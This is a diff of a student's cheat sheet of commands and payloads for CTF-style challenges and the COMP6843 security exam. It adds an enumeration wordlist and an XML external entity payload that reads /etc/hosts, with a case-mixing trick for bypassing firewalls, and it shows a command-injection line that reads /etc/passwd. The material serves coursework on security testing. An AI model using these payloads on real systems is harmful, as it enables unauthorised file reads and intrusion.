@@ -1,5 +1,5 @@
 # 6843 CMDS + PAYLOADS  
-Copy pasta some quick access commands + payloads for CTF challenges + exam.  
+Copy pasta some commands + payloads for CTF-style challenges + COMP6843 final exam.
 
 ---
 ### Security Setup
@@ -19,8 +19,9 @@ Copy pasta some quick access commands + payloads for CTF challenges + exam.
 Port Numbers, Directories, Subdomains, Files... be imaginative.
 ```
 noone
-sketch
-sketchy
+sketch / sketchy
+sy
+carey / cry
 9447 / 6841 / 6441
 robots.txt
 flag
@@ -184,8 +185,21 @@ original_cmd_by_server $(cat /etc/passwd)
 
 
 ---
-### XML External Entities
+### XXE (XML External Entities)
 ---  
+
+XXE standard:  
+* NOTE: "FILe" upper/lowercase mix was to bypass firewalls
+* Use a valid XML feed, otherwise it will probably fail to parse. i.e. chuck `&xxe;` in legit xml elements in the feed.
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+        <!ENTITY xxe SYSTEM "FILe:%2F%2F%2Fetc/hosts" >
+]>
+<element>&xxe;</element>
+```
+
+XXE Out-of-Bounds attack:
 ```
 
 ```
